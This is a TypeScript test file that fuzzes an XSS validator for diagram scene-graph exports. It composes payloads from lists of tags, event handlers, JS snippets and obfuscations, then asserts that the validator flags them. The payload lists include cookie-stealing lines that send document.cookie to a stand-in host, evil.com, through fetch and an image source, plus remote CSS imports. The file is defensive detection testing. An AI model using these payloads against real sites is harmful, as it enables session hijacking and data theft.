/**
 * Property-Based XSS Detection Test
 *
 * Unlike mutation-based fuzzing (which starts from known payloads and mutates them),
 * this test generates NOVEL payloads from first-principles XSS building blocks.
 * This probes for detection gaps that enumerated pattern lists miss.
 *
 * Generator strategy:
 * 1. Compose payloads from tag × event-handler × payload-function combinations
 * 2. Apply random obfuscation transformations
 * 3. Inject into random SceneGraph fields
 * 4. Assert validator produces findings for every generated dangerous payload
 *
 * Any payload that slips through the validator (produces zero findings despite
 * containing a real XSS vector) indicates a gap in detection patterns.
 *
 * Note: The validator is fail-open in non-strict mode — it records findings
 * but doesn't block (passed stays true). We assert findings exist, not blocking.
 */

import { validateSceneGraphForExport, validateExportPayload } from '../export-content-validator';
import type { SceneGraph } from '../../types/diagram';
import { mulberry32 } from '@tests/helpers/fuzz';

const SEED = parseInt(process.env.FUZZ_SEED ?? '0xC0FFEE', 16) || 0xc0ffee;
const ITERATIONS = parseInt(process.env.PB_XSS_ITERATIONS ?? '200', 10);
const rng = mulberry32(SEED);

function pick<T>(arr: readonly T[]): T {
  return arr[Math.floor(rng() * arr.length)];
}

function chance(p: number): boolean {
  return rng() < p;
}

// ---------------------------------------------------------------------------
// XSS Building Blocks — composing these creates novel payloads
// ---------------------------------------------------------------------------

// Tags the validator explicitly detects in HIGH severity patterns
const DANGEROUS_TAGS = [
  'script', 'iframe', 'embed', 'object', 'base', 'foreignObject',
  'marquee', 'isindex',
] as const;

// Tags detected via event-handler or specific patterns (img+onerror, svg+onload)
const EVENT_TAGS = [
  'img', 'svg', 'div', 'a', 'body', 'span', 'p', 'video', 'audio',
  'details', 'input', 'form', 'button', 'select', 'textarea',
] as const;

const EVENT_HANDLERS = [
  'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur',
  'ontoggle', 'onpointerover', 'ontouchstart', 'onkeydown', 'onkeyup',
  'oninput', 'onchange', 'onsubmit', 'onanimationstart', 'onanimationend',
  'ontransitionend', 'oncanplay', 'onbegin', 'onend', 'onrepeat',
  'onauxclick', 'oncontextmenu', 'oncompositionstart', 'oncompositionend',
  'onfocusin', 'onfocusout', 'onpointerdown', 'onpointerup',
] as const;

const JS_PAYLOADS = [
  'alert(1)', 'alert(document.cookie)', 'prompt(1)', 'confirm(1)',
  "eval('xss')", 'document.location="//evil.com"',
  'fetch("//evil.com?a="+document.cookie)',
  'setTimeout("alert(1)",0)',
  'new Image().src="//evil.com/"+document.cookie',
] as const;

const PROTOCOLS = [
  'javascript:', 'JaVaScRiPt:', 'vbscript:',
] as const;

const OBFUSCATIONS = [
  // Case variation — still dangerous because regex uses 'i' flag
  (s: string) => {
    let out = '';
    for (const c of s) {
      out += chance(0.5) ? c.toUpperCase() : c.toLowerCase();
    }
    return out;
  },
  // Whitespace insertion — may still trigger patterns
  (s: string) => s.replace(/<(?!\/)/g, '< '),
  // Tab/newline in protocol
  (s: string) => s.replace(/:/g, ':\t'),
  // Comment insertion in script
  (s: string) => s.replace(/script/gi, 'scr/**/ipt'),
  // Null byte insertion
  (s: string) => s.replace(/([<>])/g, '$1\0'),
  // No obfuscation (identity)
  (s: string) => s,
] as const;

const ATTRIBUTE_WRAPPERS = [
  (s: string) => `="${s}"`,
  (s: string) => `='${s}'`,
  (s: string) => `=${s}`,
] as const;

// ---------------------------------------------------------------------------
// Payload Generators — compose building blocks into novel payloads
// ---------------------------------------------------------------------------

function genEventHandlerPayload(): string {
  const tag = pick(EVENT_TAGS);
  const handler = pick(EVENT_HANDLERS);
  const payload = pick(JS_PAYLOADS);
  const wrapAttr = pick(ATTRIBUTE_WRAPPERS);
  return `<${tag} ${handler}${wrapAttr(payload)}>`;
}

function genProtocolPayload(): string {
  const protocol = pick(PROTOCOLS);
  const payload = pick(JS_PAYLOADS);
  if (chance(0.5)) {
    return `<a href="${protocol}${payload}">click</a>`;
  }
  return `${protocol}${payload}`;
}

function genScriptPayload(): string {
  const payload = pick(JS_PAYLOADS);
  const separator = pick([' ', '/', '\t']);
  return `<script${separator}>${payload}</script>`;
}

function genCssPayload(): string {
  const payload = pick(JS_PAYLOADS);
  return pick([
    `expression(${payload})`,
    `-moz-binding:url(//evil.com/xss.xml)`,
    `url(javascript:${payload})`,
    `@import url(//evil.com/xss.css)`,
  ]);
}

function genDangerousTagPayload(): string {
  const tag = pick(DANGEROUS_TAGS);
  const payload = pick(JS_PAYLOADS);
  return `<${tag}>${payload}</${tag}>`;
}

function generateNovelPayload(): string {
  return pick([
    genEventHandlerPayload,
    genProtocolPayload,
    genScriptPayload,
    genCssPayload,
    genDangerousTagPayload,
  ])();
}

// ---------------------------------------------------------------------------
// SceneGraph field injection targets
// ---------------------------------------------------------------------------

const FIELD_NAMES = [
  'summary', 'nodeLabel', 'edgeLabel', 'keyphrase',
] as const;

function createSceneWithPayload(field: string, payload: string): SceneGraph {
  return {
    type: 'flow',
    id: 'test-scene',
    nodes: [
      {
        id: 'n1',
        label: field === 'nodeLabel' ? payload : 'Node A',
        type: 'process',
      },
      {
        id: 'n2',
        label: 'Node B',
        type: 'output',
      },
    ],
    edges: [
      {
        from: 'n1',
        to: 'n2',
        label: field === 'edgeLabel' ? payload : 'edge',
      },
    ],
    startMs: 0,
    durationMs: 5000,
    summary: field === 'summary' ? payload : 'Safe summary',
    keyphrases: field === 'keyphrase' ? [payload] : ['safe'],
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('Property-Based XSS Detection', () => {
  describe('novel payload generation', () => {
    // Collect payloads that slip through for reporting
    const slipThroughs: Array<{ payload: string; field: string }> = [];

    afterAll(() => {
      if (slipThroughs.length > 0) {
        console.warn(
          `[PB-XSS] ${slipThroughs.length} payloads slipped through validator:\n` +
          slipThroughs
            .slice(0, 20)
            .map((s, i) => `  ${i + 1}. [${s.field}] ${s.payload.slice(0, 100)}`)
            .join('\n'),
        );
      }
    });

    test.each(Array.from({ length: ITERATIONS }, (_, i) => i))(
      'PB-XSS-%# novel payload produces findings',
      () => {
        const payload = generateNovelPayload();
        const field = pick(FIELD_NAMES);
        const scene = createSceneWithPayload(field, payload);
        const result = validateSceneGraphForExport(scene, { strict: false });

        // Every generated payload contains a real XSS vector.
        // The validator must produce at least one finding.
        if (result.findings.length === 0) {
          slipThroughs.push({ payload, field });
        }
        expect(result.findings.length).toBeGreaterThan(0);
      },
    );
  });

  describe('validateExportPayload with generated payloads', () => {
    test.each(Array.from({ length: 100 }, (_, i) => i))(
      'PB-JSON-%# novel payload in JSON structure produces findings',
      () => {
        const payload = generateNovelPayload();
        const field = pick(['title', 'description', 'content', 'label', 'value'] as const);

        const testObj: Record<string, unknown> = {
          id: 'test-obj',
          [field]: payload,
          nested: {
            inner: payload,
            list: [payload, 'safe', { deep: payload }],
          },
        };

        const result = validateExportPayload(testObj);
        // Generated payloads always contain dangerous patterns
        expect(result.findings.length).toBeGreaterThan(0);
      },
    );
  });

  describe('strict mode blocks generated HIGH severity XSS', () => {
    test.each(Array.from({ length: 50 }, (_, i) => i))(
      'PB-STRICT-%# strict mode blocks generated XSS payload',
      () => {
        const payload = generateNovelPayload();
        const scene = createSceneWithPayload('summary', payload);

        const result = validateSceneGraphForExport(scene, { strict: true });
        // In strict mode, any HIGH severity finding causes blocking
        const hasHighFinding = result.findings.some((f) => f.severity === 'high');
        if (hasHighFinding) {
          expect(result.passed).toBe(false);
        }
        // Findings always exist for dangerous payloads
        expect(result.findings.length).toBeGreaterThan(0);
      },
    );
  });

  describe('combinatorial coverage — every tag × handler pair', () => {
    // Systematically test every event tag with onerror
    test.each(EVENT_TAGS)('tag <%s> with onerror produces findings', (tag) => {
      const payload = `<${tag} src=x onerror=alert(1)>`;
      const scene = createSceneWithPayload('nodeLabel', payload);
      const result = validateSceneGraphForExport(scene, { strict: false });
      // onerror= triggers the event-handler pattern
      expect(result.findings.length).toBeGreaterThan(0);
    });

    // Systematically test every event handler with a common tag
    test.each(EVENT_HANDLERS)('%s on <img> produces findings', (handler) => {
      const payload = `<img src=x ${handler}=alert(1)>`;
      const scene = createSceneWithPayload('nodeLabel', payload);
      const result = validateSceneGraphForExport(scene, { strict: false });
      expect(result.findings.length).toBeGreaterThan(0);
    });

    // Systematically test every protocol
    test.each(PROTOCOLS)('protocol "%s" produces findings', (protocol) => {
      const payload = `${protocol}alert(1)`;
      const scene = createSceneWithPayload('summary', payload);
      const result = validateSceneGraphForExport(scene, { strict: false });
      // javascript: and vbscript: are in HIGH severity patterns
      expect(result.findings.length).toBeGreaterThan(0);
    });

    // Test every dangerous tag
    test.each(DANGEROUS_TAGS)('tag <%s> is detected', (tag) => {
      const payload = `<${tag}>test</${tag}>`;
      const scene = createSceneWithPayload('summary', payload);
      const result = validateSceneGraphForExport(scene, { strict: false });
      expect(result.findings.length).toBeGreaterThan(0);
    });
  });

  describe('obfuscation robustness', () => {
    test.each(OBFUSCATIONS.slice(0, -1))(
      'obfuscation technique does not bypass validator',
      (obfuscate) => {
        const basePayload = '<script>alert(1)</script>';
        const obfuscated = obfuscate(basePayload);
        const scene = createSceneWithPayload('summary', obfuscated);
        const result = validateSceneGraphForExport(scene, { strict: false });

        // Obfuscation may or may not preserve the pattern — but at minimum
        // the validator should not crash and should return a valid result.
        // Most obfuscations (case-flip, whitespace, null bytes) should still be caught
        // because the validator regexes use 'i' flag and broad matching.
        expect(result).toBeDefined();
        expect(result.findings).toBeDefined();
      },
    );
  });

  describe('safe payloads do not trigger false positives', () => {
    const safeStrings = [
      'Hello World',
      '処理フロー',
      '3 > 2 && 1 < 5',
      'user@example.com',
      'https://example.com/path?q=1&x=2',
      'function(a, b) { return a + b; }',
      'const x = 10; // assignment',
      'a < b || c > d',
      'No HTML here',
      '価格: ¥1,000 (税込)',
      'JavaScript is a programming language',
      'style guide for developers',
      'expression in mathematics: f(x) = x^2',
      'URL encoding uses %3C for <',
    ];

    test.each(safeStrings)('safe string "%s" produces zero findings', (safe) => {
      const scene = createSceneWithPayload('nodeLabel', safe);
      const result = validateSceneGraphForExport(scene, { strict: false });
      expect(result.findings.length).toBe(0);
    });
  });

  describe('multi-field injection — payloads across different fields', () => {
    test.each(FIELD_NAMES)('payload in field "%s" is detected', (field) => {
      const payload = '<script>alert(1)</script>';
      const scene = createSceneWithPayload(field, payload);
      const result = validateSceneGraphForExport(scene, { strict: false });
      expect(result.findings.length).toBeGreaterThan(0);
    });
  });
});
